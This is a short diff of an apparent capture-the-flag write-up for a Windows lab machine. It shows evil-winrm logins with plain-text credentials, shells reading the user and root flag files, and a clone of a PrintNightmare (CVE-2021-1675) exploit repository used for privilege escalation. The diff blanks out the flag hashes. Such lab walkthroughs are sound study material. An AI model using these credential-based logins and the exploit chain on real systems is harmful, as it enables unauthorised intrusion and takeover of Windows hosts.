@@ -95,7 +95,7 @@ WINRM       10.10.11.106    5985   NONE             [+] None\tony:liltony (Pwn3d
 [+]USERFLAG[+]
 ❯ evil-winrm -i 10.10.11.106 -u tony -p liltony
 *Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
-8b91b77eab566d90d95014ebb4f14c61
+
 
 
 [+]PRINT NIGHTMARE[+]
@@ -114,4 +114,4 @@ git clone https://github.com/calebstewart/CVE-2021-1675
 ❯ evil-winrm -i 10.10.11.106 -u admin -p admin
 
 *Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
-abaa97111f6e2a3f250832dee1e6710a
+
